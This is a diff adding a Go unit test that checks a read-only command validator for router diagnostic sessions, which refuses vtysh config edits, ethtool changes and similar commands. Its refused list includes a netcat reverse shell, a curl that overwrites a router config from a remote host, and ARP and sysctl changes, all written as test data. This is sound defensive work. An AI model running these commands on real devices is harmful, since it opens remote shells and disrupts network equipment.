@@ -149,3 +149,56 @@ func TestADiagnosticSessionCannotHideAWriteBehindAnOption(t *testing.T) {
 		}
 	}
 }
+
+// The long option is the same option.
+//
+// The vtysh rule matched the literal "-c" and nothing else, so
+// `vtysh --command 'configure terminal' --command 'interface lo' ...` went
+// through untouched and a diagnostic session edited a router. And `ethtool -K`
+// turns offloads off on a device the session is only meant to watch, which no
+// scan for write verbs would ever have found: the fix for a denylist that keeps
+// being walked past is not a longer denylist.
+func TestADiagnosticSessionHasAGrammarRatherThanADenylist(t *testing.T) {
+	refused := [][]string{
+		{"vtysh", "--command", "configure terminal"},
+		{"vtysh", "--command=configure terminal"},
+		{"vtysh", "-c=configure terminal"},
+		{"vtysh", "-d", "bgpd", "-c", "show ip bgp"},
+		{"vtysh", "-b"},
+		{"vtysh", "-f", "/tmp/config"},
+		{"ethtool", "-K", "host", "rx", "off"},
+		{"ethtool", "-k", "host"},
+		{"nc", "-e", "/bin/sh", "10.0.0.1", "9"},
+		{"curl", "-o", "/etc/frr/frr.conf", "http://x/"},
+		{"wget", "-O", "/tmp/x", "http://x/"},
+		{"birdc", "configure"},
+		{"ss", "-K", "dst", "10.0.0.1"},
+		{"arp", "-d", "10.0.0.1"},
+		{"arp", "-s", "10.0.0.1", "00:11:22:33:44:55"},
+		{"hostname", "not-this-router"},
+		{"sysctl", "net.ipv4.ip_forward=0"},
+		{"sysctl", "-p"},
+	}
+	for _, c := range refused {
+		if err := ReadOnlyCommand(c); err == nil {
+			t.Errorf("%v can change the device or is not needed to observe one, and was "+
+				"allowed", c)
+		}
+	}
+	allowed := [][]string{
+		{"vtysh", "--command", "show ip bgp summary"},
+		{"vtysh", "--command=show running-config"},
+		{"vtysh", "-c", "show ip route json"},
+		{"ss", "-tnp"},
+		{"arp", "-n"},
+		{"hostname"},
+		{"hostname", "-f"},
+		{"sysctl", "net.ipv4.ip_forward"},
+		{"iptables-save"},
+	}
+	for _, c := range allowed {
+		if err := ReadOnlyCommand(c); err != nil {
+			t.Errorf("%v only observes, and was refused: %v", c, err)
+		}
+	}
+}
